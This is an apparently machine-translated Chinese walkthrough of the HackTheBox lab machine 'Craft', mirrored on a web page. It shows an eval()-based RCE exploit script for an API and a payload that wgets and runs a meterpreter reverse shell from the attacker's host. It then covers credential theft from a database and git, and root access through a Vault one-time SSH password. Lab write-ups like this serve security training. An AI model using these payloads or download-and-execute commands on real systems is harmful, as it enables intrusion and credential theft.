<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🖲️ 🚛 👃 哈克盒子-演练工艺。 我们深入研究Git，利用API中的漏洞，处理保险柜 🔎 👨🏿‍🤝‍👨🏻 🌖</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="在本文中，我将开始发布从HackTheBox网站发送的用于进一步处理的解决方案。 我希望这将至少帮助某人在信息安全领域发展。 我们将研究如何在API中利用RCE，深入研究Gogs存储库，使用数据库以及处理Vault秘密存储和管理系统。 

 通过VPN连接到实验室。 建议不要从可用的计算机或主机上连...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>哈克盒子-演练工艺。 我们深入研究Git，利用API中的漏洞，处理保险柜</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/482970/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/z4/tn/ez/z4tnezybmcfihio9svzufxldfxq.png" alt="图片"></div><br> 在本文中，我将开始发布从<a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a>网站发送的用于<a href="https://www.hackthebox.eu/" rel="nofollow">进一步处理的</a>解决方案。 我希望这将至少帮助某人在信息安全领域发展。 我们将研究如何在API中利用RCE，深入研究Gogs存储库，使用数据库以及处理Vault秘密存储和管理系统。 <br><br> 通过VPN连接到实验室。 建议不要从可用的计算机或主机上连接对您来说很重要的数据，因为您最终会与一个在信息安全领域有了解的人建立私有网络：) <br><br><div class="spoiler">  <b class="spoiler_title">组织信息</b> <div class="spoiler_text"> 特别是对于那些想要学习新知识并在信息和计算机安全性的任何领域中发展的人们，我将撰写和讨论以下类别： <br><br><ul><li>  PWN； </li><li> 密码学（加密）； </li><li> 网络技术（网络）； </li><li> 反向（反向工程）； </li><li> 隐写术（Stegano）； </li><li> 搜索和利用Web漏洞。 </li></ul><br> 除此之外，我还将分享我在计算机取证，恶意软件和固件分析，对无线网络和局域网的攻击，进行笔测试和编写漏洞利用程序方面的经验。 <br><a name="habracut"></a><br> 为了使您可以查找有关新文章，软件和其他信息的信息，我<a href="https://t.me/RalfHackerChannel" rel="nofollow">在Telegram中</a>创建了一个<a href="https://t.me/RalfHackerChannel" rel="nofollow">频道，</a>并创建了一个<a href="https://t.me/RalfHackerPublicChat" rel="nofollow">小组来讨论</a> ICD领域的<a href="https://t.me/RalfHackerPublicChat" rel="nofollow">所有问题</a> 。 另外，我会亲自考虑您的个人要求，问题，建议和建议， <a href="https://t.me/hackerralf8" rel="nofollow">并会回答所有人</a> 。 <br><br> 提供所有信息仅出于教育目的。 对于由于使用本文档而获得的知识和方法对某人造成的任何损害，本文档的作者不承担任何责任。 <br></div></div><br><h2> 智商 </h2><br><h3> 端口扫描 </h3><br> 这台机器的IP地址为10.10.10.110，我将其添加到/ etc / hosts中。 <br> <code>10.10.10.110 craft.htb</code> <br> 首先，我们使用nmap扫描开放的端口，并指定-A选项以获取有关已发现服务的尽可能多的信息。 <br><pre> <code class="bash hljs">nmap -A craft.htb</code> </pre> <br><img src="https://habrastorage.org/webt/bm/oe/-0/bmoe-0yy3psiltb1fqoqwleakbw.png" alt="图片"><br><br> 在机器上，我们看到ssh服务以及在端口443上运行的Web服务器。 如果您访问Web服务器，那么我们会提供有关API的信息。 <br><br><img src="https://habrastorage.org/webt/s9/ju/wv/s9juwver3cyta7lvimc36oovys8.png" alt="图片"><br><br> 当我们尝试查看API和git时，会被告知有关未知站点的信息。 <br><br><img src="https://habrastorage.org/webt/fs/n8/gd/fsn8gdkxcjagfcxrrrdcjblxrwi.png" alt="图片"><br><br> 因此，我们将两个域名都添加到/ etc / hosts中。 <br> <code>10.10.10.110 api.craft.htb <br> 10.10.10.110 gogs.craft.htb</code> <br> <br> 现在，两个链接都打开了。  Craft API应该是与API配合使用的接口，因此对于初学者来说，我们需要弄清楚它的工作方式，哪些Gogs可以帮助我们。 <br><br><img src="https://habrastorage.org/webt/3k/tf/6s/3ktf6sictzsrvx8exye1ztl8clo.png" alt="图片"><br><br><h2> 入口点 </h2><br> 在git中，首先要检查的是提交。 <br><br><img src="https://habrastorage.org/webt/gn/et/od/gnetodmhksh0te2su6k7g4iagt4.png" alt="图片"><br><br> 经过提交后，在10e3ba4f0a中，我们找到了用户的身份验证数据。 <br><br><img src="https://habrastorage.org/webt/et/go/ep/etgoephnl29pzvauktdgc3bnqdg.png" alt="图片"><br><br> 对应登录到gogs之后，我们发现了有关该bug的提及。 <br><br><img src="https://habrastorage.org/webt/kd/ef/ce/kdefcetbxjiwprf5obkroiskq9k.png" alt="图片"><br><br> 通过单击链接，我们发现在eval（）函数中如何进行验证，这非常危险，因为您可以在此函数中执行代码。 <br><br><img src="https://habrastorage.org/webt/dw/qo/c4/dwqoc4tub5lu285z6d732edka1e.png" alt="图片"><br><br> 为了检验假设，在本地python控制台中，我们将对该函数进行模拟，然后尝试从“ os”模块调用“ system（）”函数。 <br><br><img src="https://habrastorage.org/webt/yk/xv/jt/ykxvjtizcdg0sb3dtoo9ssrxzqm.png" alt="图片"><br><br> 代码已成功执行！ 现在，您需要编写漏洞利用程序才能重新建立连接。 在第一阶段，复制用于身份验证和令牌接收的代码。 <br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python import requests import json response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False) json_response = json.loads(response.text) token = json_response['token'] headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' } # make sure token is valid response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False) print(response.text) # create a sample brew with bogus ABV... should fail. print("Create bogus ABV brew") brew_dict = {} brew_dict['abv'] = '15.0' brew_dict['name'] = 'bullshit' brew_dict['brewer'] = 'bullshit' brew_dict['style'] = 'bullshit' json_data = json.dumps(brew_dict) response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False) print(response.text)</span></span></code> </pre> <br> 在此代码中，我们的负载通过“ abv”参数传递，因此要检查RCE假设，我们将字符串'15 .0'替换为“ __import __（'os'）。System（'ping your_ip'）”。 <br><br> 我们打开tcpdump，指示仅侦听和过滤ICMP数据包的参数并启动该漏洞利用的接口。 <br><br><img src="https://habrastorage.org/webt/h3/lu/8q/h3lu8q3bzjdbzbd72cokrtf7yzk.png" alt="图片"><br><br><img src="https://habrastorage.org/webt/gs/_e/pg/gs_epgjam_0e5quilzxyybw2ngg.png" alt="图片"><br><br> 我们观察到我们能够从远程主机ping通自己。 现在，我们进行反向连接。 可以通过nc来完成，但是让我们获得一个meterpreter shell。 为此，请使用msfvenom生成负载。 我们指定负载本身（reverse_tcp），本地主机和端口（LHOST，LPORT），文件格式为elf。 <br><br><img src="https://habrastorage.org/webt/hz/hh/cb/hzhhcbcjpz6d8u4kfdntcltgffm.png" alt="图片"><br><br> 同时，我们打开本地Web服务器。 现在，在msfconsole中配置侦听器。 为此，请像在负载中一样设置参数。 <br><br><img src="https://habrastorage.org/webt/im/op/f-/imopf-po-e3tqp9uebbey-5mj9u.png" alt="图片"><br><br> 我们监听传入的连接，现在我们需要将负载加载到主机上并启动它。 <br> <code>brew_dict['abv'] = 'wget http://10.10.14.199/shell.bin ; chmod +x shell.bin ; ./shell.bin'</code> <br> 在metasplit窗口中，我们看到一个传入的连接。 <br><br><img src="https://habrastorage.org/webt/-b/ji/uw/-bjiuwp51-ibbggge9ifjibpk44.png" alt="图片"><br><br><h2> 用户名 </h2><br> 让我们启动外壳，看看我们的工作对象。 <br><br><img src="https://habrastorage.org/webt/gk/0v/nb/gk0vnbephoxohkfkryxl8rjkw64.png" alt="图片"><br><br> 根据终端的结论，我们可以假设我们在docker容器中。 看看主持人。 <br><br><img src="https://habrastorage.org/webt/vt/kf/vy/vtkfvyttw0pm6cu9fu622bph25s.png" alt="图片"><br><br> 有一个可执行文件dbtest.py。 你应该看 <br><br><img src="https://habrastorage.org/webt/z3/bx/px/z3bxpx73m7ryxf0bwx9a_iiohla.png" alt="图片"><br><br> 程序连接到数据库，并执行命令和后续输出。 让我们看看数据库。 为此，我在主机上启动了交互式python控制台，并在执行命令之前将所有代码复制到其中。 <br><br><img src="https://habrastorage.org/webt/8u/cr/6g/8ucr6g8pnav_tlmssc-4fezkddu.png" alt="图片"><br><br> 现在我们将请求表格。 <br><br><img src="https://habrastorage.org/webt/ni/dk/zz/nidkzzk_6l1cxsmepos8e3ivbr0.png" alt="图片"><br><br> 结果，我们返回了2条记录。 由于cursor.fetchone（）输出一个条目，因此我们将执行两个这样的输出。 <br><br><img src="https://habrastorage.org/webt/jt/vl/wl/jtvlwlt2deghbovntbgholk9okk.png" alt="图片"><br><br> 这样我们得到了2张桌子。 用户更有趣。 我们显示该表中的所有数据。 <br><br><img src="https://habrastorage.org/webt/ui/hz/-_/uihz-_dr6zswnlw-56fgk2mfsv8.png" alt="图片"><br><br> 并且其中有3个条目。 <br><br><img src="https://habrastorage.org/webt/vn/1b/ld/vn1bldjjzns-pr_bnkakr_-zwcm.png" alt="图片"><br><br> 而且我们获得了用户积分。 在ssh上尝试过它们，但失败了，我们尝试进入git。 结果证明是以gilfoyle身份登录。 而且他有一个封闭的存储库。 <br><br><img src="https://habrastorage.org/webt/my/wg/bb/mywgbbpurqlg0eussi8i8a1cico.png" alt="图片"><br><br><img src="https://habrastorage.org/webt/tp/g8/0h/tpg80hngu3h9tqyvtvdjxm7ogek.png" alt="图片"><br><br>  .ssh目录非常有趣。 有两个密钥，我们选择一个私有密钥。 <br><br><img src="https://habrastorage.org/webt/gb/rl/hq/gbrlhqduihwomlm6ed3kkqbozms.png" alt="图片"><br><br> 我们正在尝试通过ssh使用此密钥进行连接。 <br><br><img src="https://habrastorage.org/webt/d5/qg/lm/d5qglmkwzmowjqsjwk-w3iofnl4.png" alt="图片"><br><br><h2> 根 </h2><br> 首先要在用户目录中查看。 <br><br><img src="https://habrastorage.org/webt/wn/-z/-t/wn-z-tfhmdf043zqv8z42xag-fe.png" alt="图片"><br><br> 我们从金库中找到令牌。 <br><br><img src="https://habrastorage.org/webt/cb/52/p6/cb52p6sdmtwkylg4ntvprllwlpo.png" alt="图片"><br><br> 在处理了<a href="https://www.vaultproject.io/" rel="nofollow">Vault之后</a> ，我将说这是一个用于密钥的存储和管理系统，其中包含键/值格式的数据，可以通过令牌访问这些数据。 检查是否已设置存储。 <br><br><img src="https://habrastorage.org/webt/b_/nw/ps/b_nwpsqz5ep9dwtiyyzjfljq9tc.png" alt="图片"><br><br> 让我们<a href="https://www.vaultproject.io/docs/commands/secrets/list.html" rel="nofollow">来看看秘密清单</a> 。 <br><br><img src="https://habrastorage.org/webt/z3/kz/3t/z3kz3tsmbxo2abhoyzipuqqpnuu.png" alt="图片"><br><br> 因此，我们看到<a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" rel="nofollow">对ssh的访问已配置</a> 。 <br><br><img src="https://habrastorage.org/webt/nl/3c/zw/nl3czwq1rihro8z5s5gavqji74i.png" alt="图片"><br><br> 现在，我们输入提供给我们的一次性密码，并且我们以root用户身份进入系统。 <br><br><img src="https://habrastorage.org/webt/_h/7x/s3/_h7xs3eb2-msqjwwvu6gum8exgi.png" alt="图片"><br><br> 您可以通过<a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a>加入我们。 让我们建立一个社区，在这个社区中，会有一些精通IT领域的人，然后我们可以在任何IT和信息安全问题上互相帮助。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN482970/">https://habr.com/ru/post/zh-CN482970/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN482950/index.html">Java：对于经验丰富的开发人员而言似乎有些好奇的事情</a></li>
<li><a href="../zh-CN482956/index.html">WCS 5.2-用于Webcast和Webcam开发人员的WebRTC服务器的评论</a></li>
<li><a href="../zh-CN482958/index.html">“成长规则：从初级到首席技术官”，Fedor Borshchev的网络研讨会摘要</a></li>
<li><a href="../zh-CN482960/index.html">WCS 5.2概述-用于在线广播和视频聊天的Web开发人员的WebRTC服务器</a></li>
<li><a href="../zh-CN482968/index.html">Quarkus-云原生Java的新外观</a></li>
<li><a href="../zh-CN482974/index.html">虚拟现实的心理健康支持</a></li>
<li><a href="../zh-CN482976/index.html">股票交易中的匿名交易分析</a></li>
<li><a href="../zh-CN482978/index.html">Python中有300行的区块链解析器</a></li>
<li><a href="../zh-CN482980/index.html">Oracle本身从Amazon S3复制了API，这很好</a></li>
<li><a href="../zh-CN482986/index.html">通过文件在1C：Trade Management 11和1C：Accounting 3.0之间建立交换的分步说明</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>